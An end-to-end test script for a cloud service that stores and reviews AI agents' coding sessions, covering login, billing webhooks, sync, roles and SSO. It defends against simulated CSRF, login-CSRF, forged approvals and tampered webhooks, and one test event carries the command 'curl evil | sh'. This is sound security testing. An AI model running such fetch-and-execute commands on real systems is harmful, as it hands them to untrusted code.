// Run with `pnpm build && pnpm test:e2e`. Uses throwaway data in the OS temp folder and only obviously fake credentials.
// End-to-end: REAL cloud server (next start) + REAL ard CLI + signed Paddle/Dodo webhooks + REAL OIDC redirects (local IdP).
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = resolve(fileURLToPath(new URL("..", import.meta.url)));
const { ControlStore, CLOUD_MIGRATIONS } = await import(`${ROOT}/packages/cloud/dist/index.js`);
const { mockIdp } = await import(`${ROOT}/packages/cloud/dist/testkit.js`);
const { openDb, appendEvent, baseFields } = await import(`${ROOT}/packages/core/dist/index.js`);
const { signPaddleWebhook, signDodoWebhook } = await import(`${ROOT}/packages/billing/dist/index.js`);
const { paddleSubscriptionEvent, dodoSubscriptionEvent } = await import(`${ROOT}/packages/billing/dist/testkit.js`);

const PORT = Number(process.env.ARD_E2E_PORT ?? 47800);
const IDP_PORT = Number(process.env.ARD_E2E_IDP_PORT ?? 47801);
const BASE = `http://127.0.0.1:${PORT}`;
const IDP = `http://127.0.0.1:${IDP_PORT}`;
const work = mkdtempSync(join(tmpdir(), "ard-e2e-cloud-"));
const dataDir = join(work, "cloud-data");
const configDir = join(work, "cli-config");
const project = join(work, "project");
mkdirSync(project, { recursive: true });
mkdirSync(join(project, ".git"));

const PADDLE_SECRET = "pdl_ntfset_e2e_" + "s".repeat(24);
const DODO_SECRET = "whsec_" + Buffer.from("e2e-dodo-webhook-secret-32bytes!").toString("base64");

let pass = 0;
let fail = 0;
const failures = [];
function check(name, ok, detail = "") {
  if (ok) { pass++; console.log(`  ok    ${name}`); }
  else { fail++; failures.push(name); console.log(`  FAIL  ${name}${detail ? `  -> ${detail}` : ""}`); }
}
const section = (t) => console.log(`\n== ${t} ==`);

// ---------------------------------------------------------------- mock IdP (real HTTP)
const idp = mockIdp({ issuer: IDP, clientSecret: "sso-secret" });
const idpServer = createServer(async (req, res) => {
  const url = new URL(req.url, IDP);
  if (url.pathname === "/authorize") {
    const code = idp.issueCode(url.toString(), "sso-client", { email: "erin@e2e.test", subject: "sso-erin", name: "Erin" });
    const back = new URL(url.searchParams.get("redirect_uri"));
    back.searchParams.set("code", code);
    back.searchParams.set("state", url.searchParams.get("state"));
    res.writeHead(302, { location: back.toString() }).end();
    return;
  }
  let body = "";
  for await (const chunk of req) body += chunk;
  const reply = await idp.fetch(url.toString(), { method: req.method, headers: {}, body: body || undefined, redirect: "manual", signal: AbortSignal.timeout(5000) });
  res.writeHead(reply.status, { "content-type": "application/json" }).end(await reply.text());
});
await new Promise((r) => idpServer.listen(IDP_PORT, "127.0.0.1", r));

// ------------------------------------------------------------------ cloud server
// `next start` also loads apps/cloud/.env, which may hold a developer's real settings. Next never overrides a variable that
// already exists, so blank every ARD_* name the server knows about first: this test must not see (or use) real credentials.
const knownNames = [...readFileSync(`${ROOT}/apps/cloud/.env.example`, "utf8").matchAll(/^#?\s*(ARD_[A-Z0-9_]+)=/gm)].map((m) => m[1]);
const blanked = Object.fromEntries(knownNames.map((name) => [name, ""]));
const serverEnv = {
  ...process.env,
  ...blanked,
  NODE_ENV: "production",
  ARD_CLOUD_SECRET: "e2e-secret-" + "x".repeat(40),
  ARD_CLOUD_BASE_URL: BASE,
  ARD_CLOUD_DATA_DIR: dataDir,
  ARD_CLOUD_DEV_LOGIN: "1",
  ARD_CLOUD_ALLOW_PRIVATE_OIDC: "1",
  ARD_PADDLE_API_KEY: "pdl_sdbx_apikey_" + "k".repeat(30),
  ARD_PADDLE_WEBHOOK_SECRET: PADDLE_SECRET,
  ARD_PADDLE_PRICE_ID: "pri_e2e",
  ARD_PADDLE_CLIENT_TOKEN: "test_abcdefghijklmnopqrstuvwxyz1",
  ARD_DODO_API_KEY: "dodo_test_" + "k".repeat(30),
  ARD_DODO_WEBHOOK_SECRET: DODO_SECRET,
  ARD_DODO_PRODUCT_ID: "pdt_e2e",
};
const server = spawn(process.execPath, [`${ROOT}/apps/cloud/node_modules/next/dist/bin/next`, "start", "-H", "127.0.0.1", "-p", String(PORT)], { cwd: `${ROOT}/apps/cloud`, env: serverEnv, stdio: ["ignore", "pipe", "pipe"] });
let serverLog = "";
server.stdout.on("data", (d) => (serverLog += d));
server.stderr.on("data", (d) => (serverLog += d));
for (let i = 0; i < 60; i++) {
  try { if ((await fetch(`${BASE}/api/health`)).ok) break; } catch {}
  await new Promise((r) => setTimeout(r, 500));
}

// -------------------------------------------------------------------- helpers
class Jar {
  cookies = new Map();
  take(res) { for (const c of res.headers.getSetCookie?.() ?? []) { const [pair] = c.split(";"); const eq = pair.indexOf("="); const v = pair.slice(eq + 1); if (c.includes("Max-Age=0") || v === "") this.cookies.delete(pair.slice(0, eq)); else this.cookies.set(pair.slice(0, eq), v); } }
  header() { return [...this.cookies].map(([k, v]) => `${k}=${v}`).join("; "); }
}
async function call(method, path, { jar, form, json, headers = {}, origin = BASE, raw, bearer } = {}) {
  const h = { ...headers };
  if (jar && jar.header()) h.cookie = jar.header();
  if (origin && method !== "GET") h.origin = origin;
  if (bearer) h.authorization = `Bearer ${bearer}`;
  let body;
  if (form) { body = new URLSearchParams(form).toString(); h["content-type"] = "application/x-www-form-urlencoded"; }
  if (json !== undefined) { body = JSON.stringify(json); h["content-type"] = "application/json"; }
  if (raw !== undefined) body = raw;
  const res = await fetch(`${BASE}${path}`, { method, headers: h, body, redirect: "manual" });
  jar?.take(res);
  const text = await res.text();
  let parsed; try { parsed = JSON.parse(text); } catch {}
  return { status: res.status, headers: res.headers, text, json: parsed, location: res.headers.get("location") ?? "" };
}
const stripComments = (s) => s.replace(/<!-- -->/g, "");
const flash = (loc, kind) => decodeURIComponent((new URL(loc, BASE).searchParams.get(kind) ?? "").replace(/\+/g, " "));

function ard(args, { cwd = project, env = {} } = {}) {
  const child = spawn(process.execPath, [`${ROOT}/packages/cli/dist/index.js`, ...args], { cwd, env: { ...process.env, ARD_CLOUD_URL: BASE, ARD_CONFIG_DIR: configDir, ...env }, stdio: ["ignore", "pipe", "pipe"] });
  const promise = new Promise((resolve) => {
    let out = ""; let err = "";
    child.stdout.on("data", (d) => (out += d));
    child.stderr.on("data", (d) => (err += d));
    child.on("close", (code) => resolve({ code, out, err }));
  });
  promise.child = child;
  return promise;
}

// ===================================================================== RUN
try {
  section("server");
  const health = await call("GET", "/api/health");
  check("server is up and healthy", health.status === 200 && health.json?.ok === true, serverLog.slice(-300));
  const control = new ControlStore(openDb(join(dataDir, "control.db"), CLOUD_MIGRATIONS));

  section("sign in (dev login) and create an organization");
  const owner = new Jar();
  const noCookie = await call("GET", "/o/e2e");
  check("an organization page redirects a signed-out visitor to sign in", noCookie.status === 307 || noCookie.status === 303, String(noCookie.status));
  const login = await call("POST", "/api/auth/dev", { jar: owner, form: { email: "owner@e2e.test" } });
  check("dev login sets an HttpOnly SameSite=Lax session cookie", login.status === 303 && /HttpOnly/i.test(login.headers.getSetCookie().join(";")) && /SameSite=Lax/i.test(login.headers.getSetCookie().join(";")), login.headers.getSetCookie().join(";"));
  const crossLogin = await call("POST", "/api/auth/dev", { form: { email: "x@e2e.test" }, origin: "http://evil.example" });
  check("cross-origin dev login is refused", crossLogin.status === 403, String(crossLogin.status));
  // What a REAL browser sends for a form on our own page: the site sends Referrer-Policy: no-referrer, so Origin is the string "null".
  const browserJar = new Jar();
  const browserLike = await call("POST", "/api/auth/dev", { jar: browserJar, form: { email: "browser@e2e.test" }, origin: "null", headers: { "sec-fetch-site": "same-origin" } });
  check("a real browser form post (Origin: null, Sec-Fetch-Site: same-origin) is accepted", browserLike.status === 303 && browserJar.cookies.size === 1, String(browserLike.status));
  const forgedOrigin = await call("POST", "/api/auth/dev", { form: { email: "x@e2e.test" }, origin: BASE, headers: { "sec-fetch-site": "cross-site" } });
  check("a cross-site request is refused even when its Origin header claims to be us", forgedOrigin.status === 403, String(forgedOrigin.status));
  const sameSite = await call("POST", "/api/auth/dev", { form: { email: "x@e2e.test" }, origin: BASE, headers: { "sec-fetch-site": "same-site" } });
  check("a same-site (sibling subdomain) request is refused", sameSite.status === 403, String(sameSite.status));
  const created = await call("POST", "/api/org/create", { jar: owner, form: { name: "E2E Team", slug: "e2e" } });
  check("organization is created and the owner lands on it", created.status === 303 && created.location.includes("/o/e2e"), created.location);
  const crossCreate = await call("POST", "/api/org/create", { jar: owner, form: { name: "Evil", slug: "evil" }, origin: "http://evil.example" });
  check("cross-origin organization creation is refused (CSRF)", crossCreate.status !== 200 && flash(crossCreate.location, "error").length > 0 && !control.getOrgBySlug("evil"), crossCreate.location);
  const page = await call("GET", "/o/e2e", { jar: owner });
  check("the owner sees the organization page with the free-plan notice", page.status === 200 && /free plan/.test(stripComments(page.text)), String(page.status));
  const org = control.getOrgBySlug("e2e");

  section("ard login (real device flow, approved in the 'browser')");
  const loginRun = ard(["login"]);
  const child = loginRun.child;
  let loginOut = "";
  child.stdout.on("data", (d) => (loginOut += d)); // (a second listener: the helper keeps its own copy for the final result)
  let userCode = "";
  for (let i = 0; i < 40 && !userCode; i++) { await new Promise((r) => setTimeout(r, 250)); userCode = /confirm the code\s+([A-Z0-9]{4}-[A-Z0-9]{4})/.exec(loginOut)?.[1] ?? ""; }
  check("the CLI prints a code and a link", userCode.length === 9 && loginOut.includes(`${BASE}/device?code=${userCode}`), loginOut.slice(0, 200));
  const stranger = new Jar();
  const deviceNoLogin = await call("POST", "/api/device/approve", { jar: stranger, form: { code: userCode, decision: "approve" } });
  check("approving without being signed in does not work", flash(deviceNoLogin.location, "error") !== "" || deviceNoLogin.location.includes("next="), deviceNoLogin.location);
  const approve = await call("POST", "/api/device/approve", { jar: owner, form: { code: userCode.toLowerCase(), decision: "approve" } });
  check("the signed-in owner approves the code", approve.status === 303 && flash(approve.location, "notice").includes("Approved"), approve.location);
  const loginResult = await loginRun;
  check("ard login finishes and says who it signed in", loginResult.code === 0 && /Signed in as owner@e2e\.test/.test(loginResult.out), loginResult.out + loginResult.err);
  const credFile = join(configDir, "credentials.json");
  check("the token file is owner-only (0600)", existsSync(credFile) && (statSync(credFile).mode & 0o777) === 0o600);
  const reuse = await call("POST", "/api/device/approve", { jar: owner, form: { code: userCode, decision: "approve" } });
  check("the code cannot be used a second time", flash(reuse.location, "error") !== "", reuse.location);

  section("free plan: sync is refused, review is paused");
  const t0 = Date.now();
  for (let i = 0; i < 2; i++) appendEvent(join(project, ".ard", "events.jsonl"), { ...baseFields({ sessionId: "sess-1", agent: "claude-code", cwd: "/work/app" }), type: i === 0 ? "session_start" : "command", ...(i === 0 ? { capture: "hook" } : { command: "pnpm test", exitCode: 1, stdout: "FAIL token=sk-ant-" + "a".repeat(40) }) });
  appendEvent(join(project, ".ard", "events.jsonl"), { ...baseFields({ sessionId: "sess-1", agent: "claude-code", cwd: "/work/app" }), type: "file_change", path: "src/a.ts", operation: "modify", oldText: "return a - b;", newText: "return a + b;" });
  appendEvent(join(project, ".ard", "events.jsonl"), { ...baseFields({ sessionId: "sess-1", agent: "ard-review", cwd: "/work/app" }), type: "approval", targetSessionId: "sess-1", decision: "approved", decidedBy: "forger" });
  const whoFree = await ard(["whoami"]);
  check("whoami lists the organization as Free", /e2e\s+owner\s+Free/.test(whoFree.out), whoFree.out + whoFree.err);
  const dry = await ard(["sync", "--org", "e2e", "--dry-run"]);
  check("dry run summarizes and sends nothing", dry.code === 0 && /4 events from 1 session/.test(dry.out) && /nothing was sent/.test(dry.out), dry.out + dry.err);
  const noConsent = await ard(["sync", "--org", "e2e"]);
  check("first sync without --yes is refused locally", noConsent.code === 1 && /--yes/.test(noConsent.err), noConsent.err);
  const paywalled = await ard(["sync", "--org", "e2e", "--yes"]);
  check("sync to a free organization is refused with a clear 'Team subscription' message", paywalled.code === 1 && /Team subscription/.test(paywalled.err), paywalled.err);
  const token = JSON.parse(readFileSync(credFile, "utf8")).servers[BASE].token;
  const raw402 = await call("POST", "/api/v1/orgs/e2e/events", { bearer: token, json: { events: [] } });
  check("the API answers 402 payment_required for the free plan", raw402.status === 402 && raw402.json?.code === "payment_required", String(raw402.status));

  section("Paddle webhook: signature checks, then the plan switches on");
  const nonce = "e2e-nonce-" + Math.random().toString(36).slice(2);
  const owner0 = control.upsertPlatformUser("owner@e2e.test");
  control.createCheckout({ orgId: org.id, userId: owner0.id, provider: "paddle", nonce });
  const goodRaw = paddleSubscriptionEvent({ nonce, transactionId: "txn_e2e", subscriptionId: "sub_e2e", customerId: "ctm_e2e", eventId: "evt_e2e_1" });
  const ts = Math.floor(Date.now() / 1000);
  const hit = (raw, header) => call("POST", "/api/webhooks/paddle", { raw, headers: { "paddle-signature": header, "content-type": "application/json" }, origin: null });
  const bad = await hit(goodRaw, `ts=${ts};h1=${"0".repeat(64)}`);
  check("a webhook with a wrong signature is refused (400) and changes nothing", bad.status === 400 && control.getOrg(org.id).subStatus === null, String(bad.status));
  const tampered = await hit(goodRaw.replace("active", "actives"), signPaddleWebhook(PADDLE_SECRET, goodRaw, ts));
  check("a body changed after signing is refused", tampered.status === 400, String(tampered.status));
  const missing = await hit(goodRaw, "");
  check("a webhook with no signature header is refused", missing.status === 400, String(missing.status));
  const unmatched = await hit(paddleSubscriptionEvent({ nonce: "never-issued", transactionId: "txn_x", subscriptionId: "sub_x", eventId: "evt_x" }), signPaddleWebhook(PADDLE_SECRET, paddleSubscriptionEvent({ nonce: "never-issued", transactionId: "txn_x", subscriptionId: "sub_x", eventId: "evt_x" }), ts));
  check("a validly signed event for someone else's/unknown checkout is acknowledged but applied to nobody", unmatched.status === 200 && unmatched.json?.outcome === "unmatched" && control.getOrg(org.id).subStatus === null, JSON.stringify(unmatched.json));
  const applied = await hit(goodRaw, signPaddleWebhook(PADDLE_SECRET, goodRaw, ts));
  check("the correctly signed subscription event is applied", applied.status === 200 && applied.json?.outcome === "applied", JSON.stringify(applied.json));
  const again = await hit(goodRaw, signPaddleWebhook(PADDLE_SECRET, goodRaw, ts));
  check("redelivery is recognized as a duplicate", again.json?.outcome === "duplicate", JSON.stringify(again.json));
  const whoTeam = await ard(["whoami"]);
  check("whoami now shows the Team plan", /e2e\s+owner\s+Team/.test(whoTeam.out), whoTeam.out);

  section("ard sync (Team plan): upload, incremental, server-side safety");
  const synced = await ard(["sync", "--org", "e2e", "--yes"]);
  check("sync uploads the recorded events", synced.code === 0 && /Uploaded 3 new events/.test(synced.out), synced.out + synced.err);
  check("a forged review decision in the local log is not uploaded", /1 review decision\(s\) were not uploaded/.test(synced.out), synced.out);
  const synced2 = await ard(["sync", "--org", "e2e"]);
  check("a second sync has nothing new", /Nothing new/.test(synced2.out), synced2.out);
  appendEvent(join(project, ".ard", "events.jsonl"), { ...baseFields({ sessionId: "sess-1", agent: "claude-code", cwd: "/work/app" }), type: "command", command: "git status", exitCode: 0 });
  const synced3 = await ard(["sync", "--org", "e2e"]);
  check("only the new event is uploaded next time", /Uploaded 1 new event\b/.test(synced3.out), synced3.out);
  const sessions = await call("GET", "/o/e2e", { jar: owner });
  const sessionsText = stripComments(sessions.text);
  check("the team workspace lists the synced session with its uploader", sessions.status === 200 && sessionsText.includes("owner@e2e.test") && sessionsText.includes("claude-code"), String(sessions.status));
  const detail = await call("GET", "/o/e2e/sessions/sess-1", { jar: owner });
  const detailText = stripComments(detail.text);
  check("the session page shows the timeline and the diff", detail.status === 200 && detailText.includes("pnpm test") && detailText.includes("return a + b;"), "");
  // The command output WAS rendered (the word FAIL is there), and the secret inside it was replaced: not merely absent because nothing was shown.
  check("the command output is shown, with the secret in it redacted by the SERVER", detailText.includes("FAIL token=") && detailText.includes("[REDACTED:anthropic-key]") && !detailText.includes("sk-ant-"), detailText.match(/FAIL token=[^<]{0,60}/)?.[0] ?? "(output not rendered)");  check("...and shows no review although a forged 'approved' was in the upload", /Not reviewed yet/.test(detailText), "");

  section("review in the cloud workspace");
  const review = await call("POST", "/api/o/e2e/sessions/sess-1/review", { jar: owner, json: { decision: "rejected", note: "needs a second look" } });
  check("an owner can review", review.status === 200 && review.json?.ok === true, JSON.stringify(review.json));
  const afterReview = stripComments((await call("GET", "/o/e2e/sessions/sess-1", { jar: owner })).text);
  check("the review shows with the reviewer's e-mail and the note", afterReview.includes("rejected") && afterReview.includes("owner@e2e.test") && afterReview.includes("needs a second look"), "");
  const crossReview = await call("POST", "/api/o/e2e/sessions/sess-1/review", { jar: owner, json: { decision: "approved" }, origin: "http://evil.example" });
  check("a cross-origin review request is refused (CSRF)", crossReview.status === 403, String(crossReview.status));
  const badReview = await call("POST", "/api/o/e2e/sessions/sess-1/review", { jar: owner, json: { decision: "maybe" } });
  check("an invalid decision is refused", badReview.status === 400, String(badReview.status));

  section("roles: invite, accept, and what a plain member may do");
  const invite = await call("POST", "/api/o/e2e/members/invite", { jar: owner, form: { email: "bob@e2e.test", role: "member" } });
  const inviteToken = new URL(invite.location, BASE).searchParams.get("invite");
  check("an invitation link is created", invite.status === 303 && inviteToken?.length === 48, invite.location);
  const bob = new Jar();
  await call("POST", "/api/auth/dev", { jar: bob, form: { email: "bob@e2e.test" } });
  const carol = new Jar();
  await call("POST", "/api/auth/dev", { jar: carol, form: { email: "carol@e2e.test" } });
  const wrong = await call("POST", `/api/invite/${inviteToken}`, { jar: carol });
  check("someone else cannot use Bob's invitation", flash(wrong.location, "error").includes("different e-mail"), wrong.location);
  const join_ = await call("POST", `/api/invite/${inviteToken}`, { jar: bob });
  check("Bob accepts and lands in the organization", join_.status === 303 && join_.location.includes("/o/e2e"), join_.location);
  const reuseInvite = await call("POST", `/api/invite/${inviteToken}`, { jar: bob });
  check("the invitation works only once", flash(reuseInvite.location, "error") !== "", reuseInvite.location);
  const bobView = await call("GET", "/o/e2e", { jar: bob });
  check("a member can read the sessions", bobView.status === 200 && stripComments(bobView.text).includes("owner@e2e.test"), String(bobView.status));
  const bobReview = await call("POST", "/api/o/e2e/sessions/sess-1/review", { jar: bob, json: { decision: "approved" } });
  check("a member cannot review (403)", bobReview.status === 403, String(bobReview.status));
  const bobBilling = await call("GET", "/o/e2e/billing", { jar: bob });
  check("a member is told they cannot open Billing", /does not allow that/.test(stripComments(bobBilling.text)), "");
  const bobSso = await call("GET", "/o/e2e/sso", { jar: bob });
  check("a member is told they cannot open SSO settings", /does not allow that/.test(stripComments(bobSso.text)), "");
  const bobCheckout = await call("POST", "/api/o/e2e/billing/checkout", { jar: bob, form: { provider: "paddle" } });
  check("a member cannot start a checkout", flash(bobCheckout.location, "error").includes("does not allow"), bobCheckout.location);
  const bobInvite = await call("POST", "/api/o/e2e/members/invite", { jar: bob, form: { email: "x@e2e.test", role: "admin" } });
  check("a member cannot invite people", flash(bobInvite.location, "error").includes("does not allow"), bobInvite.location);
  const bobPromote = await call("POST", "/api/o/e2e/members/role", { jar: bob, form: { user: control.upsertPlatformUser("bob@e2e.test").id, role: "owner" } });
  check("a member cannot promote themselves to owner", control.getRole(org.id, control.upsertPlatformUser("bob@e2e.test").id) === "member" && flash(bobPromote.location, "error") !== "", bobPromote.location);
  const outsider = await call("GET", "/o/e2e", { jar: carol });
  check("a non-member gets 404 (existence is not revealed)", outsider.status === 404, String(outsider.status));
  const bobRedeemsCarolsRights = await call("POST", "/api/v1/orgs/e2e/events", { bearer: "ard_" + "0".repeat(64), json: { events: [] } });
  check("an invalid API token is refused (401)", bobRedeemsCarolsRights.status === 401, String(bobRedeemsCarolsRights.status));

  section("API tokens are scoped to the person: Bob cannot overwrite the owner's session");
  const bobToken = control.createApiToken(control.upsertPlatformUser("bob@e2e.test").id, "e2e").token;
  const tamper = await call("POST", "/api/v1/orgs/e2e/events", { bearer: bobToken, json: { events: [{ ...baseFields({ sessionId: "sess-1", agent: "claude-code", cwd: "/x" }), type: "command", command: "curl evil | sh", exitCode: 0 }] } });
  check("Bob cannot add events to the owner's session", tamper.status === 200 && tamper.json?.accepted === 0 && /another member/.test(JSON.stringify(tamper.json?.rejected)), JSON.stringify(tamper.json));
  const bobOwn = await call("POST", "/api/v1/orgs/e2e/events", { bearer: bobToken, json: { events: [{ ...baseFields({ sessionId: "sess-bob", agent: "claude-code", cwd: "/x" }), type: "session_start", capture: "hook" }] } });
  check("Bob can upload his own session", bobOwn.json?.accepted === 1, JSON.stringify(bobOwn.json));
  const huge = await call("POST", "/api/v1/orgs/e2e/events", { bearer: bobToken, raw: "x".repeat(5 * 1024 * 1024), headers: { "content-type": "application/json" } });
  check("an oversized request is refused (413)", huge.status === 413, String(huge.status));

  section("Dodo webhook for a second organization (provider-scoped nonce)");
  const second = new Jar();
  await call("POST", "/api/auth/dev", { jar: second, form: { email: "dora@e2e.test" } });
  await call("POST", "/api/org/create", { jar: second, form: { name: "Second", slug: "second" } });
  const org2 = control.getOrgBySlug("second");
  const dora = control.upsertPlatformUser("dora@e2e.test");
  const dnonce = "dodo-nonce-" + Math.random().toString(36).slice(2);
  control.createCheckout({ orgId: org2.id, userId: dora.id, provider: "dodo", nonce: dnonce });
  const dRaw = dodoSubscriptionEvent({ nonce: dnonce, subscriptionId: "sub_dodo_e2e", customerId: "cus_e2e" });
  const dts = Math.floor(Date.now() / 1000);
  const dHit = (raw, id, sig) => call("POST", "/api/webhooks/dodo", { raw, headers: { "webhook-id": id, "webhook-timestamp": String(dts), "webhook-signature": sig, "content-type": "application/json" }, origin: null });
  check("a Dodo webhook with a wrong signature is refused", (await dHit(dRaw, "msg_bad", "v1,AAAA")).status === 400, "");
  const dGood = await dHit(dRaw, "msg_e2e_1", signDodoWebhook(DODO_SECRET, "msg_e2e_1", dts, dRaw));
  check("a correctly signed Dodo event switches the second organization to Team", dGood.json?.outcome === "applied" && control.getOrg(org2.id).subStatus === "active", JSON.stringify(dGood.json));
  check("...and not the first one's plan (still its own paddle subscription)", control.getOrg(org.id).billingProvider === "paddle", control.getOrg(org.id).billingProvider);
  const crossNonce = await dHit(dodoSubscriptionEvent({ nonce, subscriptionId: "sub_cross" }), "msg_cross", signDodoWebhook(DODO_SECRET, "msg_cross", dts, dodoSubscriptionEvent({ nonce, subscriptionId: "sub_cross" })));
  check("a Paddle checkout nonce presented through Dodo matches nothing", crossNonce.json?.outcome === "unmatched", JSON.stringify(crossNonce.json));

  section("single sign-on (real OIDC redirects against a local IdP)");
  const ssoSave = await call("POST", "/api/o/e2e/sso/save", { jar: owner, form: { issuer: IDP, clientId: "sso-client", clientSecret: "sso-secret", emailDomain: "e2e.test", defaultRole: "reviewer" } });
  check("the owner saves SSO settings (discovery succeeds)", flash(ssoSave.location, "notice").includes("saved"), flash(ssoSave.location, "error") || ssoSave.location);
  const bobSsoSave = await call("POST", "/api/o/e2e/sso/save", { jar: bob, form: { issuer: IDP, clientId: "x", clientSecret: "x", emailDomain: "e2e.test", defaultRole: "member" } });
  check("a non-owner cannot change SSO settings", flash(bobSsoSave.location, "error").includes("does not allow"), bobSsoSave.location);
  const stored = control.getSsoConfig(org.id);
  check("the client secret is stored encrypted", stored && !stored.clientSecretSealed.includes("sso-secret"), "");
  const erin = new Jar();
  const begin = await call("POST", "/api/auth/sso", { jar: erin, form: { org: "e2e" } });
  check("SSO login redirects to the company IdP with PKCE", begin.status === 303 && begin.location.startsWith(`${IDP}/authorize`) && /code_challenge_method=S256/.test(begin.location), begin.location);
  const idpHop = await fetch(begin.location, { redirect: "manual" });
  const callbackUrl = idpHop.headers.get("location");
  const cb = await fetch(callbackUrl, { redirect: "manual", headers: { cookie: erin.header() } });
  erin.take(cb);
  check("the IdP sends the browser back and the callback signs Erin in", cb.status === 303 && (cb.headers.get("location") ?? "").includes("/o/e2e") && erin.cookies.size === 1, `${cb.status} ${cb.headers.get("location")}`);
  const replay = await fetch(callbackUrl, { redirect: "manual" });
  check("replaying the same callback is refused (state is single use)", (replay.headers.get("location") ?? "").includes("error="), replay.headers.get("location") ?? "");
  // Login CSRF: an attacker starts a sign-in in THEIR browser and sends the callback link to a victim.
  const attacker = new Jar();
  const attackBegin = await call("POST", "/api/auth/sso", { jar: attacker, form: { org: "e2e" } });
  check("the sign-in start sets a login cookie in the browser that started it", attacker.cookies.size === 1, String(attacker.cookies.size));
  const attackCallback = (await fetch(attackBegin.location, { redirect: "manual" })).headers.get("location");
  const victim = new Jar();
  const victimHit = await fetch(attackCallback, { redirect: "manual", headers: victim.header() ? { cookie: victim.header() } : {} });
  victim.take(victimHit);
  const victimNote = decodeURIComponent((new URL(victimHit.headers.get("location") ?? "/", BASE).searchParams.get("error") ?? "").replace(/\+/g, " "));
  check("LOGIN CSRF: the callback opened in a different browser is refused", victimNote.includes("not started in this browser"), victimNote || String(victimHit.headers.get("location")));
  check("...and the victim's browser got no session", ![...victim.cookies.keys()].some((name) => name.includes("session")), [...victim.cookies.keys()].join(","));
  const attackerOwn = await fetch(attackCallback, { redirect: "manual", headers: { cookie: attacker.header() } });
  check("the browser that started it can still finish (the refusal did not burn the attempt)", attackerOwn.status === 303 && (attackerOwn.headers.get("location") ?? "").includes("/o/e2e"), `${attackerOwn.status} ${attackerOwn.headers.get("location")}`);
  const erinView = await call("GET", "/o/e2e", { jar: erin });
  check("Erin (SSO) sees the organization as a reviewer", erinView.status === 200, String(erinView.status));
  const erinMembers = stripComments((await call("GET", "/o/e2e/members", { jar: erin })).text);
  check("she appears as an SSO-provisioned member", erinMembers.includes("erin@e2e.test") && erinMembers.includes("signed in through company SSO"), "");
  const erinReview = await call("POST", "/api/o/e2e/sessions/sess-bob/review", { jar: erin, json: { decision: "approved", note: "ok" } });
  check("a reviewer from SSO can review", erinReview.status === 200, String(erinReview.status));
  const erinOther = await call("GET", "/o/second", { jar: erin });
  check("Erin cannot see any other organization (404)", erinOther.status === 404, String(erinOther.status));
  const erinCreate = await call("POST", "/api/org/create", { jar: erin, form: { name: "Hijack", slug: "hijack" } });
  check("an SSO account cannot create organizations", !control.getOrgBySlug("hijack") && flash(erinCreate.location, "error") !== "", erinCreate.location);
  const enforce = await call("POST", "/api/o/e2e/sso/enforce", { jar: owner, form: { enforce: "on" } });
  check("the owner enforces SSO", flash(enforce.location, "notice").includes("required"), enforce.location);
  const bobLocked = stripComments((await call("GET", "/o/e2e", { jar: bob })).text);
  check("with SSO enforced, a non-SSO member is locked out", /requires single sign-on/.test(bobLocked), "");
  const ownerStill = await call("GET", "/o/e2e", { jar: owner });
  check("...while the owner keeps a break-glass way in", ownerStill.status === 200, String(ownerStill.status));
  const erinStill = await call("GET", "/o/e2e", { jar: erin });
  check("...and Erin (SSO) is still fine", erinStill.status === 200, String(erinStill.status));
  const bobApi = await call("POST", "/api/v1/orgs/e2e/events", { bearer: bobToken, json: { events: [] } });
  check("...and Bob's CLI token is refused too (enforcement covers the API)", bobApi.status === 403, String(bobApi.status));

  section("headers, pages and misc");
  const home = await call("GET", "/", { jar: owner });
  check("pages send frame-ancestors none, X-Frame-Options DENY and no-store", /frame-ancestors 'none'/.test(home.headers.get("content-security-policy") ?? "") && home.headers.get("x-frame-options") === "DENY" && /no-store/.test(home.headers.get("cache-control") ?? ""), home.headers.get("content-security-policy") ?? "");
  const pay = await call("GET", "/pay?_ptxn=txn_e2e");
  check("/pay (Paddle's default payment link) is public and allows only paddle.com for scripts and frames", pay.status === 200 && /script-src[^;]*https:\/\/cdn\.paddle\.com/.test(pay.headers.get("content-security-policy") ?? "") && /frame-src https:\/\/\*\.paddle\.com/.test(pay.headers.get("content-security-policy") ?? ""), pay.headers.get("content-security-policy") ?? "");
  check("other pages do NOT allow paddle.com", !/paddle/.test(home.headers.get("content-security-policy") ?? ""), "");
  const logoutRes = await call("POST", "/api/auth/logout", { jar: bob });
  const afterLogout = await call("GET", "/o/e2e", { jar: bob });
  check("signing out ends the session", logoutRes.status === 303 && afterLogout.status !== 200, String(afterLogout.status));
  const cliOut = await ard(["logout"]);
  check("ard logout revokes the token on the server", cliOut.code === 0 && /no longer works/.test(cliOut.out), cliOut.out + cliOut.err);
  const revoked = await call("GET", "/api/v1/me", { bearer: token });
  check("...so the old token is refused immediately", revoked.status === 401, String(revoked.status));
  const noToken = await ard(["whoami"]);
  check("whoami after logout says to sign in", noToken.code === 1 && /ard login/.test(noToken.err), noToken.err);

  control.close();
} catch (error) {
  fail++;
  failures.push(`SCRIPT ERROR: ${error?.stack ?? error}`);
  console.log(`\nSCRIPT ERROR: ${error?.stack ?? error}`);
} finally {
  server.kill("SIGTERM");
  idpServer.close();
  console.log(`\npassed: ${pass}  failed: ${fail}`);
  if (fail > 0) {
    console.log("failures:\n - " + failures.join("\n - "));
    console.log("\n--- last server log ---\n" + serverLog.split("\n").slice(-25).join("\n"));
  }
  console.log(`(scratch: ${work})`);
  process.exit(fail > 0 ? 1 : 0);
}
